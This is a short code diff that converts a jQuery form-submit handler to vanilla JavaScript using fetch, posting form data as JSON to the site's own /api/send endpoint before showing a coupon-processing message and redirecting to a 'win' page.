@@ -1,22 +1,26 @@
-$(document).ready(function(){
-    $('#formData').submit(function(e) {
-        e.preventDefault(); 
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("formData");
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+    document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
-        document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
 
-        $.ajax({
-            type: 'POST',
-            url: '/api/send',
-            data: $(formData).serialize(),
-            datatype: 'text',
-            complete: function(data) {
-                vibr(180);
-                console.log('Complete')
-                setTimeout(function(){
-                    window.location.href='win.html'
-                }, 3000);
-            }
-        });
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      credentials: 'include',
+      body: JSON.stringify(data)
     });
-    return false;
+
+    vibr(180);
+    setTimeout(() => {
+      window.location.href = 'win.html';
+    }, 3000);
+  });
 });
+</script>
